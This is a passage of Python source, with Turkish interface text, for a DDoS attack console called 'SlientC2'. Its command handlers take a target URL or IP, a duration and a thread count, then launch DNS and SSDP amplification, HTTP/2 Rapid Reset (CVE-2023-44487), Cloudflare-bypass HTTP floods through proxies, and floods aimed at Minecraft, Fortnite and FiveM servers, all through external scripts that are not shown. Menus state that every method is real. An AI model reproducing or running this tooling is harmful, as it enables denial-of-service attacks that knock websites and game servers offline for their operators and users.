        print("[!] Eksik argüman. Kullanım: browser <URL> <SÜRE>")
        print("Örnek: browser https://example.com 60")
        return
    url = args[0]
    duration = args[1]
    threads = "1250"
    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "BROWSER", threads=threads, vip=True)
    history_ekle(url, port, duration, "BROWSER", threads)
    if not os.path.exists("proxy.txt"):
        print("[!] proxy.txt dosyası bulunamadı, boş oluşturuluyor...")
        with open("proxy.txt", "w") as f:
            f.write("")
    run_node_script("browser.js", [url, duration, threads, "proxy.txt"])

def cmd_minecraft(args):
    if len(args) < 3:
        print("[!] Eksik argüman. Kullanım: minecraft <IP> <PORT> <SÜRE>")
        print("Örnek: minecraft 1.1.1.1 25565 60")
        return
    ip = args[0]
    port = args[1]
    duration = args[2]
    show_attack_banner(ip, port, duration, "MINECRAFT-GO", threads="1000", vip=True)
    history_ekle(ip, port, duration, "MINECRAFT-GO", "1000")
    run_go_binary("minecraft", [ip, port, duration])

def cmd_dnsamp(args):
    if len(args) >= 2:
        target = args[0]
        duration = args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] DNS Amplification Saldırısı - Lütfen bilgileri girin:")
        print("   (Örnek: 1.1.1.1 veya example.com)")
        target = input("  ➤ Hedef (IP veya URL): ").strip()
        if not target:
            print("[!] Hedef boş olamaz.")
            return
        duration = input("  ➤ Süre (saniye): ").strip()
        if not duration.isdigit():
            print("[!] Süre sayı olmalı.")
            return
        threads = input("  ➤ Thread sayısı (varsayılan 500): ").strip()
        if not threads.isdigit():
            threads = "500"

    port = "53"
    show_attack_banner(target, port, duration, "DNS-AMP", threads=threads, vip=True)
    history_ekle(target, port, duration, "DNS-AMP", threads)
    run_script("dnsamp.py", [target, duration, threads])

def cmd_ssdp(args):
    if len(args) >= 2:
        target = args[0]
        duration = args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] SSDP Amplification Saldırısı - Lütfen bilgileri girin:")
        print("   (Örnek: 1.1.1.1)")
        target = input("  ➤ Hedef IP: ").strip()
        if not target:
            print("[!] Hedef boş olamaz.")
            return
        duration = input("  ➤ Süre (saniye): ").strip()
        if not duration.isdigit():
            print("[!] Süre sayı olmalı.")
            return
        threads = input("  ➤ Thread sayısı (varsayılan 500): ").strip()
        if not threads.isdigit():
            threads = "500"

    port = "1900"
    show_attack_banner(target, port, duration, "SSDP-AMP", threads=threads, vip=True)
    history_ekle(target, port, duration, "SSDP-AMP", threads)
    run_script("ssdp.py", [target, duration, threads])

def cmd_rapid(args):
    if len(args) >= 2:
        url = args[0]
        duration = args[1]
        threads = args[2] if len(args) > 2 else "500"
    else:
        print("\n[?] HTTP/2 Rapid Reset Saldırısı - Lütfen bilgileri girin:")
        print("   (Örnek: https://hedef.com)")
        url = input("  ➤ Hedef URL (https://...): ").strip()
        if not url:
            print("[!] URL boş olamaz.")
            return
        if not url.startswith("http"):
            url = "https://" + url
        duration = input("  ➤ Süre (saniye): ").strip()
        if not duration.isdigit():
            print("[!] Süre sayı olmalı.")
            return
        threads = input("  ➤ Thread sayısı (varsayılan 500): ").strip()
        if not threads.isdigit():
            threads = "500"

    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "H2-RESET", threads=threads, vip=True)
    history_ekle(url, port, duration, "H2-RESET", threads)
    run_go_binary("rapid", [url, duration, threads])

def cmd_uambypass(args):
    if len(args) >= 2:
        url = args[0]
        duration = args[1]
        threads = args[2] if len(args) > 2 else "50"
        proxy_file = args[3] if len(args) > 3 else "proxy.txt"
    else:
        print("\n[?] User-Agent Bypass (Cloudflare Bypass) Saldırısı")
        url = input("  ➤ Hedef URL: ").strip()
        if not url.startswith("http"):
            url = "http://" + url
        duration = input("  ➤ Süre (saniye): ").strip()
        if not duration.isdigit():
            print("[!] Süre sayı olmalı.")
            return
        threads = input("  ➤ Thread sayısı (varsayılan 50): ").strip()
        if not threads.isdigit():
            threads = "50"
        proxy_file = input("  ➤ Proxy dosyası (varsayılan proxy.txt): ").strip()
        if not proxy_file:
            proxy_file = "proxy.txt"

    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "UABYPASS", threads=threads, vip=True)
    history_ekle(url, port, duration, "UABYPASS", threads)

    if not os.path.exists(proxy_file):
        print("[!] Proxy dosyası bulunamadı, boş oluşturuluyor...")
        with open(proxy_file, "w") as f:
            f.write("1.1.1.1:8080\n2.2.2.2:8080")

    run_node_script("uambypass.js", [url, duration, threads, proxy_file])

def cmd_httpsbypass(args):
    if len(args) >= 2:
        url = args[0]
        duration = args[1]
        threads = args[2] if len(args) > 2 else "100"
    else:
        print("\n[?] HTTPS Bypass (Cloudflare Bypass) Saldırısı")
        url = input("  ➤ Hedef URL: ").strip()
        if not url.startswith("http"):
            url = "http://" + url
        duration = input("  ➤ Süre (saniye): ").strip()
        if not duration.isdigit():
            print("[!] Süre sayı olmalı.")
            return
        threads = input("  ➤ Thread sayısı (varsayılan 100): ").strip()
        if not threads.isdigit():
            threads = "100"

    port = "443" if url.startswith("https") else "80"
    show_attack_banner(url, port, duration, "HTTPSBYPASS", threads=threads, vip=True)
    history_ekle(url, port, duration, "HTTPSBYPASS", threads)

    proxy_file = "proxy.txt"
    if not os.path.exists(proxy_file):
        print("[!] Proxy dosyası bulunamadı, boş oluşturuluyor...")
        with open(proxy_file, "w") as f:
            f.write("1.1.1.1:8080\n2.2.2.2:8080")

    run_node_script("uambypass.js", [url, duration, threads, proxy_file])

# ========== RENK TEMASI VE CLEAR ==========
def cmd_theme(args):
    if len(args) < 1:
        tema_listele()
        return
    try:
        tema_no = int(args[0])
        if tema_degistir(tema_no):
            print(f"[+] Tema '{TEMALAR[tema_no]['isim']}' olarak değiştirildi.")
            show_logo_and_boxes()
        else:
            print("[!] Geçersiz tema numarası.")
    except ValueError:
        print("[!] Lütfen geçerli bir sayı girin. Örnek: theme 2")

def cmd_clear():
    show_logo_and_boxes()

# ========== MENÜLER ==========
def cmd_l7():
    os.system('clear')
    l7_lines = [
        "╔═══════════════╗",
        "║    Layer 7    ║",
        "╠═══════════════╩═══════════════════════════════════════╗",
        "║  httpflood                                          ║",
        "║  cfpro                                              ║",
        "║  flood                                              ║",
        "║  http-raw                                           ║",
        "║  http-socket                                        ║",
        "║  http-rand                                          ║",
        "║  https-spoof                                        ║",
        "║  tls                                                ║",
        "║  tls2                                               ║",
        "║  tls3                                               ║",
        "║  httpflood2                                         ║",
        "║  slow                                               ║",
        "║  rapid                                              ║",
        "║  uambypass                                          ║",
        "║  httpsbypass                                        ║",
        "╚═══════════════════════════════════════════════════════╝"
    ]
    for line in l7_lines:
        print(gradient_text(pad + line))
    print(gradient_text(pad + " " * 4 + "Not: Tüm metodlar gerçektir.\n"))

def cmd_l4():
    os.system('clear')
    l4_lines = [
        "╔═══════════════╗",
        "║    Layer 4    ║",
        "╠═══════════════╩═══════════════════════════════════════╗",
        "║  udp                                                ║",
        "║  tcpflood                                           ║",
        "║  dnsamp                                             ║",
        "║  ssdp                                               ║",
        "╚═══════════════════════════════════════════════════════╝"
    ]
    for line in l4_lines:
        print(gradient_text(pad + line))
    print(gradient_text(pad + " " * 4 + "Not: udp, tcpflood, dnsamp ve ssdp gerçek metodlardır.\n"))

def cmd_game():
    os.system('clear')
    game_lines = [
        "╔═══════════════╗",
        "║     GAME      ║",
        "╠═══════════════╩═══════════════════════════════════════╗",
        "║  fortnite                                           ║",
        "║  fivem                                              ║",
        "║  browser                                            ║",
        "║  minecraft                                          ║",
        "╚═══════════════════════════════════════════════════════╝"
    ]
    for line in game_lines:
        print(gradient_text(pad + line))
    print(gradient_text(pad + " " * 4 + "Not: fortnite, fivem, browser ve minecraft saldırıları mevcuttur.\n"))

def cmd_help():
    os.system('clear')
    help_lines = [
        "╔════════════════════════════════════╗",
        "║         SlientC2 ANA MENÜ          ║",
        "╠════════════════════════════════════╣",
        "║  L7 veya Layer7  - Layer 7 metodları ║",
        "║  L4 veya Layer4  - Layer 4 metodları ║",
        "║  GAME             - Oyun saldırıları ║",
        "║  udp / httpflood / cfpro / flood   ║",
        "║  http-raw / http-socket / http-rand",
        "║  https-spoof / tls / tls2 / tls3   ║",
        "║  httpflood2 - HTTP GET proxy flood ║",
        "║  slow       - Slowloris saldırısı  ║",
        "║  tcpflood   - TCP Flood (SYN/ACK)  ║",
        "║  fortnite   - Fortnite UDP flood   ║",
        "║  fivem      - FiveM UDP flood (Perl)",
        "║  browser    - Puppeteer tarayıcı flood (1250 thread, proxy)",
        "║  minecraft  - Minecraft sunucu flood (Go - 1000 thread)",
        "║  dnsamp     - DNS Amplification (UDP 53, 50-100x büyütme)",
        "║  ssdp       - SSDP Amplification (UDP 1900, 30x büyütme)",
        "║  rapid      - HTTP/2 Rapid Reset (CVE-2023-44487)",
        "║  uambypass  - Cloudflare bypass + HTTP flood (Node.js)",
        "║  httpsbypass - Cloudflare bypass + HTTP flood (100 thread)",
        "║  promptstyle - Prompt stilini değiştir (1=klasik, 2=özel)",
        "║  setprompt  - Yeni stildeki ilk segment metnini değiştir",
        "║  promptcolor - Yeni stil renklerini ayarla (ör: promptcolor cyan black magenta white)",
        "║  promptgradient - Yeni stil için gradient arkaplan (tool / renk1 renk2 / off)",
        "║  theme      - Renk teması değiştir (8 tema mevcut, 8=kırmızı-beyaz)",
        "║  saldırı_goster - Çıktıları açar   ║",
        "║  saldırı_kapan - Çıktıları kapatır ║",
        "║  stop       - Tüm saldırıları durdur",
        "║  clear      - Ekranı temizle       ║",
        "║  history    - Saldırı geçmişi      ║",
        "║  exit - Çıkış                      ║",
        "╚════════════════════════════════════╝"
    ]
    for line in help_lines:
        print(gradient_text(pad + line))
    print(gradient_text(pad + " " * 4 + "Örnek: theme 8, promptgradient red white, promptgradient tool\n"))

# ========== MAIN ==========
def main():
    if not login():
        return

    show_logo_and_boxes()

    try:
        while True:
            raw = prompt().strip()
            if not raw:
                continue
            parts = raw.split()
            cmd = parts[0].lower()
            args = parts[1:]

            if cmd in ("exit", "quit", "q"):
                break
            elif cmd == "help":
                cmd_help()
            elif cmd in ("l7", "layer7"):
                cmd_l7()
            elif cmd in ("l4", "layer4"):
                cmd_l4()
            elif cmd == "game":
                cmd_game()
            elif cmd == "udp":
                cmd_udp(args)
            elif cmd == "httpflood":
                cmd_httpflood(args)
            elif cmd == "cfpro":
                cmd_cfpro(args)
            elif cmd == "flood":
                cmd_flood(args)
            elif cmd == "http-raw":
                cmd_httpraw(args)
            elif cmd == "http-socket":
                cmd_httpsocket(args)
            elif cmd == "http-rand":
                cmd_httprand(args)
            elif cmd == "https-spoof":
                cmd_httpspoof(args)
            elif cmd == "tls":
                cmd_tls(args)
            elif cmd == "tls2":
                cmd_tls2(args)
            elif cmd == "tls3":
                cmd_tls3(args)
            elif cmd == "httpflood2":
                cmd_httpflood2(args)
            elif cmd == "slow":
                cmd_slow(args)
            elif cmd == "tcpflood":
                cmd_tcpflood(args)
            elif cmd == "fortnite":
                cmd_fortnite(args)
            elif cmd == "fivem":
                cmd_fivem(args)
            elif cmd == "browser":
                cmd_browser(args)
            elif cmd == "minecraft":
                cmd_minecraft(args)
            elif cmd == "dnsamp":
                cmd_dnsamp(args)
            elif cmd == "ssdp":
                cmd_ssdp(args)
            elif cmd == "rapid":
                cmd_rapid(args)
            elif cmd == "uambypass":
                cmd_uambypass(args)
            elif cmd == "httpsbypass":
                cmd_httpsbypass(args)
            elif cmd == "promptstyle":
                cmd_promptstyle(args)
            elif cmd == "setprompt":
                cmd_setprompt(args)
            elif cmd == "promptcolor":
                cmd_promptcolor(args)
            elif cmd == "promptgradient":
                cmd_promptgradient(args)
            elif cmd == "theme":
                cmd_theme(args)
            elif cmd == "saldırı_goster":
                cmd_cikti_goster()
            elif cmd == "saldırı_kapan":
                cmd_cikti_kapan()
            elif cmd == "stop":
                cmd_stop()
            elif cmd == "clear":
                cmd_clear()
            elif cmd == "history":
                history_listele()
            else:
                print(f"Bilinmeyen komut: '{cmd}'. 'help' yazın.")
    except KeyboardInterrupt:
        print("\nÇıkılıyor...")
        sys.exit(0)

if __name__ == "__main__":
    main()